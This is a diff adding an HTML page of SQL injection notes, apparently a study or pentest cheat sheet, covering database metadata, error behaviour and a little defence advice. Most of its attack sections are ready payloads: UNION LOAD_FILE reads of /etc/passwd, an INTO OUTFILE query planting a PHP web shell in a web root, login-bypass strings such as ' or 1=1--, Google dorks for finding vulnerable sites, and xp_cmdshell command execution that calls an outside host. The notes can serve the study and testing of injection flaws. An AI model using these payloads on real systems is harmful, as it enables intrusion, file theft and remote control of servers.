@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="Stylesheet" type="text/css" href="css/style.css">
+<title>SQL_Injection</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+
+<div id="SQL Injection"><h1 id="SQL Injection" class="header"><a href="#SQL Injection">SQL Injection</a></h1></div>
+
+
+<p>
+#####################################################
+##   == SQL Injection: Attack &amp; Defence Notes ==   ##
+#####################################################
+</p>
+<div id="SQL Injection-Oracle Special Characters"><h3 id="Oracle Special Characters" class="header"><a href="#SQL Injection-Oracle Special Characters">Oracle Special Characters</a></h3></div>
+<p>
+  Space -
+</p>
+<blockquote>
+|| -
+, -
+. -
+*/ -
+' -
+" -
+</blockquote>
+<ul>
+<li>
+The pipe | char can be used to append a function to a value.
+      The function will be executed and the result cast and catted.
+    Ex: <code>http://www.victim.com/id=1||utl_inaddr.get_host_address(local)</code>
+
+<li>
+An asterisk followed by a forward slash can be used to terminate a
+      comment and/or 'optimizer hint' in Oracle.
+    Ex: <code>http://www.vimtim.com/hint=*/ from dual</code>
+
+</ul>
+
+<div id="SQL Injection-SQL commands"><h3 id="SQL commands" class="header"><a href="#SQL Injection-SQL commands">SQL commands</a></h3></div>
+<p>
+LOAD_FILE -- reads a file returns its contains as a string.
+</p>
+<ul>
+<li>
+calling user must have FILE privilege (in SQL).
+
+<li>
+If quotes are escaped or validated by the server, try numbers.
+
+<li>
+The 1 in this case doesn't need quotes, b/c that would be string.
+
+</ul>
+<blockquote>
+Ex:
+<code>1 UNION ALL SELECT LOAD_FILE('/etc/passwd')</code>
+</blockquote>
+
+<p>
+<em>TIp:</em>
+</p>
+<blockquote>
+Can write out to a file with SQL:
+</blockquote>
+<ul>
+<li>
+Ex: <code>1 UNION SELECT "&lt;? system($_REQUEST['cmd'); ?&gt;" INTO OUTFILE "/var/www/html/victim.com/cmd.php"</code>
+
+<li>
+Both LOAD_FILE and SELECT INTO OUTFILE commands need MySQL user
+      permissions for FILE.
+
+</ul>
+
+<ul>
+<li>
+A cleaner discription of the SQL executed:
+<pre>
+    SELECT * FROM TABLE
+    WHERE
+    USERID = 1 UNION ALL SELECT LOAD_FILE('/etc/passwd')
+</pre>
+
+</ul>
+
+<div id="SQL Injection-Database (mis)(default)configuration"><h3 id="Database (mis)(default)configuration" class="header"><a href="#SQL Injection-Database (mis)(default)configuration">Database (mis)(default)configuration</a></h3></div>
+<p>
+MicroSoft SQL:
+</p>
+<blockquote>
+default accts:
+</blockquote>
+<ul>
+<li>
+the 'sa' account (system admin)
+    Metadata:
+
+<li>
+INFORMATION_SCHEMA exists, and also system tables:
+
+<ul>
+<li>
+sysobjects, sysindexkeys, sysindexes, syscolumns, systypes,
+          etc.
+
+<li>
+Also accessed by sytem stored procedures: SQL Srv 2005+
+          ^ catalog views called "sys.*". All users can view all tables.
+
+</ul>
+</ul>
+<p>
+MySQL:
+</p>
+<blockquote>
+default accts:
+</blockquote>
+<ul>
+<li>
+'root' and 'anonymous' accounts
+    Metadata:
+
+<li>
+in virtual database called INFORMATION_SCHEMA
+
+<li>
+cmds are (version 5.0+):
+
+<ul>
+<li>
+<code>SHOW DATABASES;</code>
+
+<li>
+<code>SHOW TABLES;</code>
+
+</ul>
+</ul>
+<p>
+Oracle:
+</p>
+<blockquote>
+default accts:
+</blockquote>
+<ul>
+<li>
+SYS, SYSTEM, DBSNMP and OUTLN
+
+<li>
+Orcale on Windows HAS TO BE run as the SYSTEM privlege acct.
+    Metadata:
+
+<li>
+built-in views: ALL_TABLES, ALL_TAB_COLUMNS, etc.
+      views prefixed with USERS_ show objects owned by user.
+      prefix of DBA_ shows all objects in the database.
+
+</ul>
+
+<p>
+<em>NB:</em> - There are lots more, and sometimes default passwords.
+</p>
+<ul>
+<li>
+ACL's have defaults too, for deny, grant access to data and/or the
+    exection of built-in stored procedures and/or functions.
+    Ex: xp_cmdshell, OPENROWSET, LOAD_FILE, ActiveX and Java, etc.
+        (See chap. 4 thru 7)
+
+</ul>
+
+<div id="SQL Injection-Accessing Views Examples"><h3 id="Accessing Views Examples" class="header"><a href="#SQL Injection-Accessing Views Examples">Accessing Views Examples</a></h3></div>
+<p>
+-- Oracle statement to enumerate all accessible tables for current user:
+<code>SELECT OWNER, TABLE_NAME FROM ALL_TABLES ORDER BY TABLE_NAME;</code>
+-- MySQL statement to enumerate all accessible tables and databases for
+-- the current user:
+<code>SELECT table_schema, table_name FROM information_schema.tables;</code>
+-- MS SQL statement to enumerate all accessible tables using the system
+-- tables:
+<code>SELECT name FROM sysobjects WHERE xtype = 'U';</code>
+-- MS SQL statement to enumerate all accessible tables using the catalog
+-- views:
+<code>SELECT name FROM sys.tables;</code>
+</p>
+
+<p>
+<em>NB:</em> - Not passible to hide or revoke access to INFORMATION_SCHEMA
+</p>
+<blockquote>
+virtual database within MySQL.
+</blockquote>
+<ul>
+<li>
+Not possible to hide or revoke access to the 'data dictionary'
+      within Oracle, as it is a view.  "You can modify the view to
+      restrict access, but Oracle does not recommend this." [1]
+
+<li>
+It <em>IS</em> possible to revoke access to INFORMATION_SCHEMA, system,
+      and sys.* tables within MS SQL Server.  This can case brakage.
+
+</ul>
+<p>
+<em>BP:</em> - Do it least privilege via the application, seprate privileged
+</p>
+<blockquote>
+roles and functions.
+</blockquote>
+
+<div id="SQL Injection-Testing by Inference"><h3 id="Testing by Inference" class="header"><a href="#SQL Injection-Testing by Inference">Testing by Inference</a></h3></div>
+<p>
+Rules: Things you know, find out:
+</p>
+<ol>
+<li>
+You identify all the data entry on the Web application.
+
+<li>
+You know what kind of request might trigger anomalies.
+
+<li>
+You detect anomalies in the response from the server.
+
+</ol>
+
+<p>
+Inputs to a Server:
+</p>
+<ul>
+<li>
+GET, POSTS, Cookies.
+
+<li>
+Headers: Host, Referer, and User-Agent may hit the db, but this is
+      less common.  Ex: some the info to create graphs and stats.
+
+</ul>
+
+<div id="SQL Injection-Show that Server probably has SQLi vuln"><h3 id="Show that Server probably has SQLi vuln" class="header"><a href="#SQL Injection-Show that Server probably has SQLi vuln">Show that Server probably has SQLi vuln</a></h3></div>
+<p>
+Try these! If the two requests act the same, could be a vuln.
+For MS-SQL and Oracle:
+<code>http://www.victim.com/showproducts.php?category=bikes</code>
+<code>http://www.victim.com/showproducts.php?category=bi'+'kes</code>
+For MySQL:
+<code>http://www.victim.com/showproducts.php?category=bikes</code>
+<code>http://www.victim.com/showproducts.php?category=bi' 'kes</code>
+</p>
+
+<p>
+## READ THIS for Error Results ##
+</p>
+<div id="SQL Injection-When DB Error Happens"><h3 id="When DB Error Happens" class="header"><a href="#SQL Injection-When DB Error Happens">When DB Error Happens</a></h3></div>
+<p>
+Results from script logic and Web server receiving an db error:
+One of 5 things:
+</p>
+<ol>
+<li>
+The SQL error is displayed on the page and is visible to the user
+       from the Web browser.
+
+<li>
+The SQL error is hidden in the <em>SOURCE</em> of the Webpage for
+       debugging purposes.
+
+<li>
+<em>REDIRECTION</em> to another page is used when an error is detected.
+
+<li>
+An HTTP error code 500 (Internal Server Error) or HTTP
+       redirection code 302 is returned.
+
+<li>
+The application handles the error properly and simply shows no
+       results, perhaps displaying a generic error page.
+
+</ol>
+<p>
+## End of Error Results ##
+<em>NB:</em> (quote) Ability to identify the remote database is paramount to
+</p>
+<blockquote>
+successfully progressing the attack and moving on to further
+exploitation. (/quote)
+</blockquote>
+
+
+<p>
+#######################################################
+##            More Random Info about SQLi            ##
+#######################################################
+</p>
+<div id="SQL Injection-GoogleDorks for SQLi's"><h2 id="GoogleDorks for SQLi's" class="header"><a href="#SQL Injection-GoogleDorks for SQLi's">GoogleDorks for SQLi's</a></h2></div>
+<p>
+Search google for these SQL Injection Vulnerable Dorks:
+</p>
+<ul>
+<li>
+inurl:index.php?id=
+
+<li>
+inurl:gallery.php?id=
+
+<li>
+inurl:article.php?id=
+
+<li>
+inurl:pageid=
+
+</ul>
+
+<div id="SQL Injection-Things to try at Form prompts"><h2 id="Things to try at Form prompts" class="header"><a href="#SQL Injection-Things to try at Form prompts">Things to try at Form prompts</a></h2></div>
+<blockquote>
+' or 1=1--
+" or 1=1--
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+</blockquote>
+
+<div id="SQL Injection-Remote execution with SQL injection"><h2 id="Remote execution with SQL injection" class="header"><a href="#SQL Injection-Remote execution with SQL injection">Remote execution with SQL injection</a></h2></div>
+<blockquote>
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+</blockquote>
+<blockquote>
+Try using double quote (") if single quote (') is not working.
+</blockquote>
+<blockquote>
+The semi-colon ends the last SQL query and starts a new one.  Setup
+a server at 10.10.1.2 and check if it receives a ICMP packet:
+</blockquote>
+
+<ol>
+<li>
+tcpdump icmp
+
+</ol>
+<blockquote>
+If no ping, administrator has limited Web User access to these stored
+procedures.
+</blockquote>
+
+</body>
+</html>
